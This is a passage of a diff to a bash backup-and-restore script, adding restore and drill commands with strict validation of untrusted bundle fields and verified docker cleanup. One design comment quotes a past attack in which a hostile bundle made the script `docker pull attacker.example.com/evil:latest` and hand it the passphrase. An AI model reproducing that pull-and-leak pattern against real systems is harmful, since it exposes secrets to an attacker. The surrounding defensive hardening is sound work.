@@ -16,10 +16,10 @@
 # Entry-guarded like deploy/install.sh:1139-1141, so deploy/backup_test.sh can
 # source it and drive the real shipped functions with the seams stubbed.
 #
-# THIS FILE IS STILL HALF-BUILT: T1 is the fact renderers and T3 is
-# `cmd_backup` below it — the run lock, the mode probe, the census, the
-# staging and the EXIT trap. `cmd_restore`, `cmd_drill` and `cmd_undo_move`
-# land beside them and consume the same facts and the same staging layout.
+# Three verbs live here: `cmd_backup` (design-verdict §9.1), `cmd_restore`
+# — which is also `restore --drill` (§9.2, §9.3) — and `cmd_drill` (§9.4),
+# above the fact renderers they all share. `cmd_undo_move` is still owed and
+# lands beside them on the same facts and the same staging layout.
 
 BK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
 BK_REPO_ROOT="$(cd "$BK_DIR/.." && pwd)"
@@ -2992,6 +2992,2439 @@ EOF
        do is named on its own line; none of them touches the bundle."
     return 4
   fi
+  return 0
+}
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║ T4 — `restore`, `restore --drill` and `drill` (design-verdict §9.2-§9.4)  ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+#
+# The half that reads the bundle back. Everything above writes one; nothing
+# above proves one can be opened on a machine that is not this one.
+#
+# THE ONE REFUSAL THAT SHAPES THE REST: restore goes onto an EMPTY target
+# only (§9.2 step 6, §14). That is why there is no pre-restore snapshot, no
+# database swap and no rollback — and the consequence, which belongs in front
+# of whoever runs it: **a bad restore cannot be undone in place.** What makes
+# that acceptable is that a non-empty target is refused before a byte is
+# written, so "a bad restore" can only mean one that failed on a machine that
+# had nothing to lose.
+#
+# NOTHING INSIDE THE BUNDLE SELECTS AN ACTION. A bundle is a file that can
+# come from anywhere. The images this verb runs are read from THIS host
+# (docker, and the checkout's own compose render) or are constants; the
+# volume it creates is named by the TARGET's render; every path it reads is
+# derived from a value it has already shape-checked. That class — an
+# unauthenticated value steering an action — has bitten this file three times
+# (s41/rulings.md, last section), and each of the three looked harmless.
+
+# ── reading MANIFEST.json, whose indentation is its grammar ─────────────────
+#
+# novabundle.dump_manifest writes `json.dumps(indent=2)`, so a top-level key
+# sits at two spaces, a nested object's keys at four, and a list item opens
+# with `{` at four and carries its own keys at six. Matching the exact column
+# is what keeps a nested object (`databases[].selftest`) from being read as a
+# new row — the mistake bk_coverage_rows was written to avoid, which dropped
+# most of a 22-entry list on its first run.
+
+# One TOP-LEVEL scalar. Non-zero when the manifest has no such key, never an
+# empty string that reads as a value.
+bk_m_top() {
+  awk -v k="$1" '
+    index($0, "  \"" k "\": ") == 1 {
+      s = substr($0, length(k) + 7)
+      sub(/,$/, "", s)
+      if (s != "null") {
+        if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/"$/, "", s) }
+        gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
+      } else { s = "" }
+      print s
+      found = 1
+      exit
+    }
+    END { exit (found ? 0 : 1) }
+  '
+}
+
+# One key of one top-level OBJECT, at exactly four spaces.
+bk_m_sub() {
+  awk -v o="$1" -v k="$2" '
+    index($0, "  \"" o "\": {") == 1 { inobj = 1; next }
+    inobj && index($0, "  }") == 1 { inobj = 0; next }
+    !inobj { next }
+    index($0, "    \"" k "\": ") == 1 {
+      s = substr($0, length(k) + 9)
+      sub(/,$/, "", s)
+      if (s != "null") {
+        if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/"$/, "", s) }
+        gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
+      } else { s = "" }
+      print s
+      found = 1
+      exit
+    }
+    END { exit (found ? 0 : 1) }
+  '
+}
+
+# Every key NAME of one top-level object, one per line. Used to compare
+# manifest.session against BK_SESSION_SQL's own six: a digest measured under
+# a frame this restore does not know is not comparable to one it re-measures
+# (measurement-frames-outlive-their-code).
+bk_m_sub_keys() {
+  awk -v o="$1" '
+    index($0, "  \"" o "\": {") == 1 { inobj = 1; next }
+    inobj && index($0, "  }") == 1 { inobj = 0; next }
+    !inobj { next }
+    index($0, "    \"") == 1 {
+      s = substr($0, 6)
+      sub(/".*$/, "", s)
+      print s
+    }
+  '
+}
+
+# Rows of one top-level LIST of objects, as US-separated fields in the order
+# $2 names them (comma-separated). US (0x1f) and not tab for the reason
+# bk_coverage_rows records: tab is IFS whitespace, so `read` collapses a run
+# of it and every field after an empty one shifts left.
+bk_m_rows() {
+  awk -v list="$1" -v keys="$2" '
+    function flush(   i, out) {
+      out = ""
+      for (i = 1; i <= nk; i++) out = out (i > 1 ? SEP : "") v[key[i]]
+      print out
+    }
+    BEGIN { SEP = sprintf("%c", 31); nk = split(keys, key, ",") }
+    index($0, "  \"" list "\": []") == 1 { exit }
+    index($0, "  \"" list "\": [") == 1 { inlist = 1; next }
+    !inlist { next }
+    index($0, "  ]") == 1 { inlist = 0; next }
+    index($0, "    {") == 1 {
+      for (i = 1; i <= nk; i++) v[key[i]] = ""
+      inrow = 1
+      next
+    }
+    !inrow { next }
+    index($0, "    }") == 1 { flush(); inrow = 0; next }
+    index($0, "      \"") == 1 {
+      name = substr($0, 8)
+      sub(/".*$/, "", name)
+      s = $0
+      sub(/^      "[^"]*": /, "", s)
+      sub(/,$/, "", s)
+      if (s == "null") { s = "" }
+      else if (substr(s, 1, 1) == "\"") { s = substr(s, 2); sub(/"$/, "", s) }
+      gsub(/\\"/, "\"", s); gsub(/\\\\/, "\\", s)
+      for (i = 1; i <= nk; i++) if (key[i] == name) v[name] = s
+    }
+  '
+}
+
+# A top-level LIST OF STRINGS (env_keys, coverage.sources), one per line.
+bk_m_strings() {
+  awk -v list="$1" '
+    index($0, "  \"" list "\": []") == 1 { exit }
+    index($0, "  \"" list "\": [") == 1 { inlist = 1; next }
+    !inlist { next }
+    index($0, "  ]") == 1 { exit }
+    {
+      s = $0
+      sub(/^    "/, "", s); sub(/",?$/, "", s)
+      if (s != "") print s
+    }
+  '
+}
+
+# ── the shapes a hostile manifest is checked against ────────────────────────
+#
+# Every one of these runs BEFORE the value reaches a command. nova_restore.py
+# already refuses an escaping member path and an illegal restore_to; these
+# are the second brace, on the values THIS shell then builds paths, SQL and
+# argv out of.
+
+bk_is_sql_name() {
+  case "$1" in
+    "" | [!A-Za-z_]*) return 1 ;;
+    *[!A-Za-z0-9_]*) return 1 ;;
+  esac
+  [ "${#1}" -le 63 ] || return 1
+  return 0
+}
+
+bk_is_volume_key() {
+  case "$1" in
+    "" | [!A-Za-z0-9]*) return 1 ;;
+    *[!A-Za-z0-9_.-]*) return 1 ;;
+  esac
+  return 0
+}
+
+# ── the images, all of them resolved on THIS host ───────────────────────────
+#
+# §9.2 step 9 and §9.3 step 2. The backup side reads the postgres image ID off
+# the running server, which is exactly what a restore target does not have, so
+# this resolves the TAG out of the checkout's own compose render and pulls it
+# if it is absent (python-tool minor 6).
+#
+# WHERE THIS DIFFERS FROM §9.3 step 2, deliberately: the verdict has the drill
+# take $PG_IMAGE "by tag from the manifest" and the decryptor from
+# `meta.fallback_image`. Both are values inside the file being opened, and the
+# 2026-09-21 amendment in s41/rulings.md settled that class for restore.sh
+# after a recording docker stub showed a hostile bundle making the restore
+# `docker pull attacker.example.com/evil:latest` and then handing it the
+# passphrase on stdin. The same argument applies here unchanged — an image
+# that has been pulled, run and fed the passphrase has survived the decrypt
+# completely — so both images are read from this host instead. port-v3 m9's
+# actual requirement (the gate checks the version it will use) is kept: ONE
+# value, used for the version gate and for the server.
+bk_render_pg_tag() {
+  local facts="$1" tag
+  tag="$(bk_cfg_service_image postgres < "$facts/config.yaml")"
+  if [ -z "$tag" ]; then
+    bk_fail "this checkout's compose render names no image for the \`postgres\` service,
+       so nothing here knows which postgres to restore through. A restore never
+       takes that name out of the bundle."
+    return 1
+  fi
+  printf '%s\n' "$tag"
+}
+
+# Present locally, or pulled and then proven present. A pull that "succeeded"
+# and left nothing behind is the fallback-that-reads-as-success this repo
+# hates; the inspect afterwards is what refuses it.
+bk_ensure_image() {
+  local tag="$1"
+  if bk_docker image inspect "$tag" >/dev/null 2>&1; then
+    printf 'image: %s is already on this host\n' "$tag" >&2
+    return 0
+  fi
+  printf 'image: pulling %s\n' "$tag" >&2
+  if ! bk_docker pull "$tag" >/dev/null 2>&1; then
+    bk_fail "\`docker pull $tag\` did not exit 0, so the image this restore needs is not
+       here and could not be fetched."
+    return 1
+  fi
+  if ! bk_docker image inspect "$tag" >/dev/null 2>&1; then
+    bk_fail "\`docker pull $tag\` exited 0 and \`docker image inspect $tag\` still reports
+       nothing. A pull that reads as success and left no image behind is worse
+       than a failed pull."
+    return 1
+  fi
+  return 0
+}
+
+# The image that decrypts. CONSTANTS and a reading off THIS host, never a
+# field of the bundle (s41/rulings.md, 2026-09-21). In order:
+#   1. NOVA_CRYPTO_IMAGE, if the operator typed one;
+#   2. this project's own core image, read off its container the way
+#      pack_image does — a drill on a machine that has run ./install;
+#   3. BK_FALLBACK_IMAGE, the constant, pulled — which is what makes a drill
+#      need docker and not a completed install (shell-first C3: this compose
+#      file carries no `image:` for core, so `nova-core` does not exist until
+#      ./install has built it).
+BK_FALLBACK_IMAGE="python:3.12-slim"
+
+bk_crypto_image() {
+  local id
+  if [ -n "${NOVA_CRYPTO_IMAGE:-}" ]; then
+    bk_ensure_image "$NOVA_CRYPTO_IMAGE" || return 1
+    printf '%s\n' "$NOVA_CRYPTO_IMAGE"
+    return 0
+  fi
+  if id="$(pack_image 2>/dev/null)" && [ -n "$id" ]; then
+    printf '%s\n' "$id"
+    return 0
+  fi
+  bk_ensure_image "${NOVA_FALLBACK_IMAGE:-$BK_FALLBACK_IMAGE}" || return 1
+  printf '%s\n' "${NOVA_FALLBACK_IMAGE:-$BK_FALLBACK_IMAGE}"
+}
+
+# ── the markers ─────────────────────────────────────────────────────────────
+
+bk_restore_marker() {
+  printf '%s\n' "${BK_RESTORE_MARKER:-$BK_DIR/.restore-in-progress}"
+}
+bk_restored_marker() {
+  printf '%s\n' "${BK_RESTORED_MARKER:-$BK_DIR/.restored}"
+}
+
+# Write $2.. as $1's body, 0600, and READ IT BACK. A path that accepts a
+# write and stores nothing is the class this catches (measured on --move: a
+# symlink to /dev/null accepts every write and keeps none).
+bk_write_marker() {
+  local path="$1" body="$2"
+  mkdir -p "$(dirname "$path")" 2>/dev/null
+  (
+    umask 077
+    printf '%s\n' "$body" > "$path"
+  ) || {
+    bk_fail "could not write $path."
+    return 1
+  }
+  chmod 600 "$path" 2>/dev/null
+  if [ "$(cat "$path" 2>/dev/null)" != "$body" ]; then
+    bk_fail "$path did not read back as it was written, so nothing here can say what
+       this run created."
+    return 1
+  fi
+  if [ "$(bk_mode_of "$path")" != "600" ]; then
+    bk_fail "$path came back mode $(bk_mode_of "$path"), not 600."
+    return 1
+  fi
+  return 0
+}
+
+# ── the drill namespace, asserted on the string that reaches the command ────
+#
+#   DRILL_RE = ^nova-drill-[0-9a-f]{8}(-pg|-net|_[A-Za-z0-9][A-Za-z0-9_.-]*)$
+#
+# python-tool M7: the shape the design first wrote (`^nova-drill-[0-9a-f]{8}$`)
+# matches NONE of the names it was said to guard, so the control was either
+# failing on every create or being applied to a different string from the one
+# `docker volume rm` receives — which is its entire purpose. This is asserted
+# immediately before every create and immediately before every delete.
+bk_drill_assert_name() {
+  local name="$1" what="$2" rest id suffix tail
+  rest="${name#nova-drill-}"
+  if [ "nova-drill-$rest" != "$name" ]; then
+    bk_drill_refuse "$name" "$what"
+    return 1
+  fi
+  id="$(printf '%s' "$rest" | cut -c1-8)"
+  suffix="$(printf '%s' "$rest" | cut -c9-)"
+  if [ "${#id}" -ne 8 ]; then
+    bk_drill_refuse "$name" "$what"
+    return 1
+  fi
+  case "$id" in
+    *[!0-9a-f]*)
+      bk_drill_refuse "$name" "$what"
+      return 1
+      ;;
+  esac
+  case "$suffix" in
+    -pg | -net) return 0 ;;
+    _[A-Za-z0-9])
+      return 0
+      ;;
+    _[A-Za-z0-9]*)
+      tail="${suffix#_?}"
+      case "$tail" in
+        *[!A-Za-z0-9_.-]*)
+          bk_drill_refuse "$name" "$what"
+          return 1
+          ;;
+      esac
+      return 0
+      ;;
+  esac
+  bk_drill_refuse "$name" "$what"
+  return 1
+}
+
+bk_drill_refuse() {
+  bk_fail "refusing to $2 the docker object '$1': a drill object is named
+       ^nova-drill-[0-9a-f]{8}(-pg|-net|_[A-Za-z0-9][A-Za-z0-9_.-]*)\$ and nothing
+       else. This is asserted on the name that reaches the command, before every
+       create and before every delete."
+}
+
+# ^nova_verify_[0-9a-f]{8}$, the drill's scratch databases. Its own prefix and
+# NOT nova_selftest_ (shell-first m11): a backup's self-test database must
+# never be a thing a concurrent drill's sweep can drop.
+bk_assert_verify_name() {
+  local name="$1" what="$2" tail
+  tail="${name#nova_verify_}"
+  if [ "nova_verify_$tail" != "$name" ] || [ "${#tail}" -ne 8 ]; then
+    bk_fail "refusing to $what a database called '$name': a drill database is named
+       ^nova_verify_[0-9a-f]{8}\$ and nothing else."
+    return 1
+  fi
+  case "$tail" in
+    *[!0-9a-f]*)
+      bk_fail "refusing to $what a database called '$name': a drill database is named
+       ^nova_verify_[0-9a-f]{8}\$ and nothing else."
+      return 1
+      ;;
+  esac
+  return 0
+}
+
+bk_hex8() {
+  local hex
+  hex="$(od -An -N4 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
+  if [ "${#hex}" -ne 8 ]; then
+    bk_fail "could not read 4 random bytes for a drill run id."
+    return 1
+  fi
+  printf '%s\n' "$hex"
+}
+
+# Every create and every delete of a drill object goes through one of these,
+# so the assertion cannot be bypassed by a new call site.
+bk_drill_volume_create() {
+  bk_drill_assert_name "$1" "create" || return 1
+  bk_docker volume create "$1" >/dev/null || return 1
+  BK_RES_DRILL_VOLS="$BK_RES_DRILL_VOLS
+$1"
+  return 0
+}
+
+bk_drill_net_create() {
+  bk_drill_assert_name "$1" "create" || return 1
+  if ! bk_docker network create --subnet "$2" "$1" >/dev/null 2>&1; then
+    bk_fail "could not create the drill network $1 with subnet $2."
+    return 1
+  fi
+  BK_RES_DRILL_NET="$1"
+  return 0
+}
+
+# ── the EXIT trap (§9.2 step 15, §9.3 step 5) ───────────────────────────────
+#
+# Two jobs, and they are not the same job.
+#
+# For a DRILL this is the teardown, and §9.3 step 5 makes it load-bearing:
+# every object the run created is removed and EVERY REMOVAL IS VERIFIED —
+# `docker inspect` must now fail with "no such". A removal that cannot be
+# verified makes the drill FAIL, naming the leftover, rather than reporting
+# success on top of a mess. Never a silent `rm -f`, never ignore_errors
+# (backend/app/backup_service.py:568-602 is the shape that taught this: a
+# `finally` does not survive a process restart, which is why `drill` also has
+# a sweep).
+#
+# For a RESTORE it removes only what is throwaway — the decrypted-content
+# volume and the host scratch dir. It deliberately DOES NOT remove
+# deploy/.restore-in-progress: that marker exists precisely to survive a
+# failure, so the re-run can quote it and offer to discard exactly the objects
+# this tool created (shell-first M4).
+BK_RES_CLEANED=0
+BK_RES_STAGE=""
+BK_RES_VOL=""
+BK_RES_DRILL_VOLS=""
+BK_RES_DRILL_NET=""
+BK_RES_DRILL_CT=""
+BK_RES_DRILL_DBS=""
+BK_RES_DRILL_PGID=""
+
+bk_restore_cleanup() {
+  local failures=0 name left
+  # Never -e, for bk_backup_cleanup's reason: under a live `-e` the first
+  # removal this could not do would abort it half way, and a teardown that
+  # stops at its first problem is exactly the mess it exists to prevent.
+  set +e
+  [ "$BK_RES_CLEANED" -eq 1 ] && return 0
+  BK_RES_CLEANED=1
+
+  # The scratch databases first: they live inside the drill container, which
+  # is removed below.
+  while IFS= read -r name; do
+    [ -n "$name" ] || continue
+    if ! bk_assert_verify_name "$name" "drop" || [ -z "$BK_RES_DRILL_PGID" ]; then
+      failures=$((failures + 1))
+      continue
+    fi
+    if ! bk_psql "$BK_RES_DRILL_PGID" postgres "DROP DATABASE IF EXISTS $(bk_sql_ident "$name")" >/dev/null 2>&1; then
+      bk_fail "the drill could not drop its scratch database $name."
+      failures=$((failures + 1))
+    fi
+  done <<EOF
+$BK_RES_DRILL_DBS
+EOF
+  BK_RES_DRILL_DBS=""
+
+  if [ -n "$BK_RES_DRILL_CT" ]; then
+    if bk_drill_assert_name "$BK_RES_DRILL_CT" "remove"; then
+      bk_docker rm -f "$BK_RES_DRILL_CT" >/dev/null 2>&1
+      if bk_docker inspect "$BK_RES_DRILL_CT" >/dev/null 2>&1; then
+        bk_fail "the drill container $BK_RES_DRILL_CT is still there after \`docker rm -f\`.
+       A removal this could not verify is a FAILED drill, not a drill with a
+       leftover."
+        failures=$((failures + 1))
+      else
+        printf 'drill: removed the container %s\n' "$BK_RES_DRILL_CT"
+      fi
+    else
+      failures=$((failures + 1))
+    fi
+    BK_RES_DRILL_CT=""
+  fi
+
+  left=""
+  while IFS= read -r name; do
+    [ -n "$name" ] || continue
+    if ! bk_drill_assert_name "$name" "remove"; then
+      failures=$((failures + 1))
+      continue
+    fi
+    bk_docker volume rm -f "$name" >/dev/null 2>&1
+    if bk_docker volume inspect "$name" >/dev/null 2>&1; then
+      bk_fail "the drill volume $name is still there after \`docker volume rm -f\`."
+      failures=$((failures + 1))
+    else
+      left="$left $name"
+    fi
+  done <<EOF
+$BK_RES_DRILL_VOLS
+EOF
+  [ -n "$left" ] && printf 'drill: removed the volumes%s\n' "$left"
+  BK_RES_DRILL_VOLS=""
+
+  if [ -n "$BK_RES_DRILL_NET" ]; then
+    if bk_drill_assert_name "$BK_RES_DRILL_NET" "remove"; then
+      bk_docker network rm "$BK_RES_DRILL_NET" >/dev/null 2>&1
+      if bk_docker network inspect "$BK_RES_DRILL_NET" >/dev/null 2>&1; then
+        bk_fail "the drill network $BK_RES_DRILL_NET is still there after \`docker network rm\`."
+        failures=$((failures + 1))
+      else
+        printf 'drill: removed the network %s\n' "$BK_RES_DRILL_NET"
+      fi
+    else
+      failures=$((failures + 1))
+    fi
+    BK_RES_DRILL_NET=""
+  fi
+
+  if [ -n "$BK_RES_VOL" ]; then
+    bk_docker volume rm -f "$BK_RES_VOL" >/dev/null 2>&1
+    if bk_docker volume inspect "$BK_RES_VOL" >/dev/null 2>&1; then
+      bk_fail "the decrypted-content volume $BK_RES_VOL is still there. It holds the
+       plaintext database dumps and the carried .env values: remove it by hand
+       with \`docker volume rm -f $BK_RES_VOL\`."
+      failures=$((failures + 1))
+    else
+      printf 'cleanup: removed the decrypted-content volume %s\n' "$BK_RES_VOL"
+    fi
+    BK_RES_VOL=""
+  fi
+
+  if [ -n "$BK_RES_STAGE" ] && [ -d "$BK_RES_STAGE" ]; then
+    rm -rf "$BK_RES_STAGE"
+    if [ -d "$BK_RES_STAGE" ]; then
+      bk_fail "could not remove $BK_RES_STAGE, which holds the carried .env values."
+      failures=$((failures + 1))
+    fi
+  fi
+  BK_RES_STAGE=""
+
+  return "$failures"
+}
+
+# ── reading out of the decrypted-content volume ─────────────────────────────
+#
+# The same split cmd_backup uses, for the same reason: the plaintext dumps
+# hold the signing key and every provider API key, and carried.env holds every
+# generated secret. They live in a throwaway docker volume the HOST NEVER
+# MOUNTS, and a container writes them.
+#
+# Three things are copied out to the host scratch dir (0700), and the list is
+# deliberately short: MANIFEST.json (whose fields are counts, digests and key
+# NAMES — test_manifest.py pins that no value in it equals any value in the
+# .env), the per-database counts TSV (counts and digests), and the migrations
+# TSV (filenames and file hashes). env/carried.env is copied too, because its
+# destination IS a host file — deploy/.env — and there is nowhere else for it
+# to go; nothing ever prints one of its values. The DUMPS and the VOLUME TREES
+# never leave the volume: they are restored container-to-container, and the
+# listings are re-derived and diffed inside the container that wrote them
+# (§9.2 step 9).
+bk_stage_get() {
+  local vol="$1" image="$2" rel="$3"
+  bk_docker run --rm --network none --user 0:0 -v "$vol:/stage:ro" \
+    --entrypoint sh "$image" -ec 'cat "/stage/$1"' sh "$rel"
+}
+
+bk_stage_has() {
+  local vol="$1" image="$2" rel="$3"
+  bk_docker run --rm --network none --user 0:0 -v "$vol:/stage:ro" \
+    --entrypoint sh "$image" -ec '[ -e "/stage/$1" ]' sh "$rel" >/dev/null 2>&1
+}
+
+# ── the manifest, which the placement does NOT leave behind ────────────────
+#
+# §9.2 steps 4 and 5 in one container run: prove the decryptor and the
+# passphrase against 64 known bytes with their own fresh salt BEFORE a
+# payload byte is read, then hand back the MANIFEST.json sealed inside.
+#
+# WHY THIS EXISTS AT ALL, because it looks like a duplicate of
+# `nova_restore.py --out` and is not. That verb places every member and then
+# does
+#
+#     carried = os.path.join(root, INNER_MANIFEST)
+#     if os.path.isfile(carried): os.rename(carried, out/MANIFEST.json)
+#
+# and `carried` is never a file: `_open_payload` reads MANIFEST.json with
+# `tar.next()` and only then re-scans, and a tarfile re-scan resumes from the
+# CURRENT offset — so the first member is not among the ones `safe_extract`
+# writes. Measured, not inferred. The guard silently never fires, so a
+# standalone restore on a bare machine hands the operator every member and
+# not the manifest that says what they are. That is `nova_restore.py`'s to
+# fix and this task may not edit it (see the report); until it is, the
+# manifest is read here.
+#
+# Everything below is nova_restore.py's OWN reviewed functions, called in its
+# own order; no crypto and no path handling is re-implemented. It decrypts the
+# payload once and reads ONE member — it does not extract the archive — so
+# the cost over `--out` is a second decrypt and not a second extraction.
+# `cryptography` is not imported anywhere in this path, which is what lets it
+# run in the fallback image a bare target actually has.
+bk_read_manifest() {
+  local dir="$1" base="$2" image="$3"
+  bk_nova -v "$dir:/bundle:ro" "$image" python3 -c '
+import json, os, shutil, sys, tarfile, tempfile
+
+sys.path.insert(0, sys.argv[1])
+import nova_restore as nr
+
+pw = sys.stdin.readline()
+if pw.endswith("\n"):
+    pw = pw[:-1]
+decrypt, backend = nr.gcm_backend()
+sys.stderr.write("decryptor backend: %s\n" % backend)
+blobs = nr.open_outer(sys.argv[2])
+mine = chosen = None
+for cand in (pw.strip(), pw):
+    if not cand:
+        continue
+    mine = nr.kat_fingerprint(blobs, cand)
+    try:
+        nr.kat_gate(blobs, cand, decrypt)
+    except nr.CryptoError:
+        continue
+    chosen = cand
+    break
+if chosen is None:
+    sys.stderr.write("ERROR: %s\n" % nr._refusal_with_fingerprint(blobs, mine))
+    raise SystemExit(1)
+sys.stderr.write("known-answer test passed: this passphrase opens this bundle (%s)\n" % mine)
+work = tempfile.mkdtemp(prefix="nova-manifest-")
+os.chmod(work, 0o700)
+try:
+  try:
+      with nr.open_outer_tar(sys.argv[2]) as tar:
+          nr.safe_extract(tar, work, members=[tar.getmember(nr.OUTER_PAYLOAD)])
+      inner = os.path.join(work, "inner.tgz")
+      with open(os.path.join(work, nr.OUTER_PAYLOAD), "rb") as fin:
+          with open(inner, "wb") as fout:
+              nr.decrypt_stream(fin, fout, chosen, decrypt)
+      with tarfile.open(inner, "r:gz") as tar:
+          first = tar.next()
+          if first is None or first.name != nr.INNER_MANIFEST:
+              sys.stderr.write(
+                  "ERROR: the inner archive starts with %r and a Nova bundle forces %s\n"
+                  % (None if first is None else first.name, nr.INNER_MANIFEST)
+              )
+              raise SystemExit(2)
+          handle = tar.extractfile(first)
+          if handle is None:
+              sys.stderr.write("ERROR: %s is not a regular file\n" % nr.INNER_MANIFEST)
+              raise SystemExit(2)
+          body = handle.read().decode("utf-8")
+      json.loads(body)
+      sys.stdout.write(body)
+  except (nr.CryptoError, nr.RestoreError, ValueError, OSError) as exc:
+    # A stated refusal, never a traceback: the person reading this is
+    # restoring at 3am and needs a sentence. Exit 2, not 1, so the caller can
+    # tell "this passphrase does not open it" from "it opened and what came
+    # out is not a bundle".
+    sys.stderr.write("ERROR: %s: %s\n" % (type(exc).__name__, exc))
+    raise SystemExit(2)
+finally:
+    shutil.rmtree(work)
+' /novabundle "/bundle/$base"
+}
+
+# ── §9.2 step 6: is this target empty? ──────────────────────────────────────
+#
+# Three findings converge on this one probe.
+#
+# `docker volume inspect` FIRST, because `docker run -v <name>:/probe` CREATES
+# a missing volume, so the probe alone can never tell "absent" from "empty".
+#
+# The EXIT STATUS is read, never the emptiness of stdout (python-tool M1,
+# measured: `ls -A /nonexistent | head -1` exits 0 with empty stdout, so every
+# failure mode read as "empty, proceed"). A non-zero exit here is "could not
+# determine", which is a REFUSAL and not a pass.
+#
+# /probe, because it is a path no image populates — so the probe cannot
+# populate the volume it is checking (shell-first m3).
+#
+#   0  the volume does not exist, or exists and is empty
+#   1  the volume exists and is not empty
+#   2  could not determine
+bk_volume_state() {
+  local full="$1" image="$2" out rc=0
+  bk_docker volume inspect "$full" >/dev/null 2>&1 || return 0
+  out="$(bk_docker run --rm --network none -v "$full:/probe:ro" --entrypoint find \
+    "$image" /probe -mindepth 1 -maxdepth 1 -print -quit 2>/dev/null)" || rc=$?
+  [ "$rc" -eq 0 ] || return 2
+  [ -z "$out" ] || return 1
+  return 0
+}
+
+# ── §9.2 step 9: fill one volume, then diff its listing IN THE CONTAINER ────
+#
+# The listing is re-derived by the same four passes that wrote it
+# (bk_tar_volume), inside a container, and compared line for line. Re-deriving
+# a tar member's sha256 proves the bytes are intact; it does not prove the
+# archive extracts, that the per-entry listing matches, or that the entry
+# count is what the manifest claims — which is port-v3 M5, and the reason the
+# drill runs this step too.
+#
+# Prints "<entries> <files> <links> <added> <removed> <changed>" and the first
+# ten differing paths on stderr.
+bk_fill_volume() {
+  local vol="$1" image="$2" src_vol="$3" key="$4" tree="$5" line
+  local entries files links added removed changed
+  line="$(bk_docker run --rm --network none --user 0:0 \
+    -v "$src_vol:/stage:ro" -v "$vol:/dst" --entrypoint sh "$image" -ec '
+      key=$1
+      tree=$2
+      src="/stage/open/volumes/$tree"
+      want="/stage/open/listings/$key.sha256"
+      [ -d "$src" ]
+      [ -f "$want" ]
+      umask 077
+      cp -a "$src/." /dst/
+      cd /dst
+      # APPLY what the sealed listing records, before measuring against it.
+      #
+      # The extraction cannot carry it: nova_restore.py extracts with python
+      # tarfile`s `data` filter, which DISCARDS uid/gid and normalises the
+      # mode. Measured on python 3.13 with a tree built for this: a 0755
+      # directory lands 0700, a 0444 file lands 0644, and every entry lands
+      # owned by whoever ran the extraction. So a restore that only copies
+      # what landed produces a volume whose permissions and ownership are not
+      # the ones that were backed up — v4_memdata is uid 1000 and
+      # v4_tailscale is root, and neither would survive.
+      #
+      # The listing is authenticated (its sha256 is in the manifest, inside
+      # the ciphertext), so this is restoring recorded DATA, not letting the
+      # bundle choose an action — and every field is shape-checked before it
+      # reaches a command: a path that is not `./…`, a path with a `..`
+      # segment, a mode that is not 3 or 4 octal digits (which is what keeps
+      # setuid, setgid and sticky out of a volume Nova mounts) or a
+      # non-numeric owner stops the whole restore.
+      #
+      # chmod and chown are allowed to FAIL here and are not checked here:
+      # the listing diff below is what judges them, and it compares the four
+      # columns entry by entry. An unapplied mode is a `changed` line, not a
+      # silent pass.
+      grep "^[dfl] " "$want" > /tmp/want.meta || :
+      while read -r kind mode uid gid p; do
+        [ -n "$kind" ] || continue
+        case "$p" in
+          ./*) ;;
+          *) printf "listing entry %s is not a ./ path\n" "$p" >&2; exit 9 ;;
+        esac
+        case "$p" in
+          */../* | */..) printf "listing entry %s carries ..\n" "$p" >&2; exit 9 ;;
+        esac
+        case "$mode" in
+          0 | [0-7][0-7][0-7] | 0[0-7][0-7][0-7]) ;;
+          *) printf "listing entry %s has mode %s\n" "$p" "$mode" >&2; exit 9 ;;
+        esac
+        case "$uid$gid" in
+          "" | *[!0-9]*) printf "listing entry %s is owned by %s:%s\n" "$p" "$uid" "$gid" >&2; exit 9 ;;
+        esac
+        if [ ! -e "$p" ] && [ ! -L "$p" ]; then
+          printf "the listing names %s and it did not land\n" "$p" >&2
+          exit 9
+        fi
+        [ "$kind" = "l" ] || chmod "$mode" "$p" 2>/dev/null || :
+        chown -h "$uid:$gid" "$p" 2>/dev/null || :
+      done < /tmp/want.meta
+      find . -mindepth 1 \( -type f -o -type l -o -type d \) -printf "%y %#m %U %G %p\n" \
+        > /tmp/meta
+      find . -type l -printf "L %p -> %l\n" >> /tmp/meta
+      LC_ALL=C sort -o /tmp/meta /tmp/meta
+      find . -type f -print0 | LC_ALL=C sort -z > /tmp/f
+      if [ -s /tmp/f ]; then xargs -0 -a /tmp/f sha256sum > /tmp/h; else : > /tmp/h; fi
+      cat /tmp/meta /tmp/h > /tmp/got
+      LC_ALL=C sort "$want" > /tmp/want.s
+      LC_ALL=C sort /tmp/got > /tmp/got.s
+      comm -13 /tmp/want.s /tmp/got.s > /tmp/plus
+      comm -23 /tmp/want.s /tmp/got.s > /tmp/minus
+      # The PATH out of each line kind, so a difference names an ENTRY rather
+      # than a line: "L <path> -> <target>", "<d|f|l> <mode> <uid> <gid>
+      # <path>", "<sha256>  <path>". A path in BOTH directions changed; one in
+      # only one was added or removed. sed and not awk here because this whole
+      # script is one single-quoted string in the caller and no apostrophe can
+      # appear in it.
+      paths() {
+        sed -n -e "s/^L \\(.*\\) -> .*$/\\1/p" \
+               -e "s/^[dfl] [0-7][0-7]* [0-9][0-9]* [0-9][0-9]* //p" \
+               -e "s/^[0-9a-f][0-9a-f]*  //p" "$1" | LC_ALL=C sort -u
+      }
+      paths /tmp/plus > /tmp/plus.p
+      paths /tmp/minus > /tmp/minus.p
+      comm -12 /tmp/plus.p /tmp/minus.p > /tmp/changed.p
+      comm -23 /tmp/plus.p /tmp/minus.p > /tmp/added.p
+      comm -13 /tmp/plus.p /tmp/minus.p > /tmp/removed.p
+      sed "s/^/added   /" /tmp/added.p > /tmp/report
+      sed "s/^/removed /" /tmp/removed.p >> /tmp/report
+      sed "s/^/changed /" /tmp/changed.p >> /tmp/report
+      head -10 /tmp/report >&2
+      printf "%s %s %s %s %s %s\n" \
+        "$(grep -c "^[dfl] " /tmp/meta || true)" \
+        "$(wc -l < /tmp/h | tr -d " ")" \
+        "$(grep -c "^L " /tmp/meta || true)" \
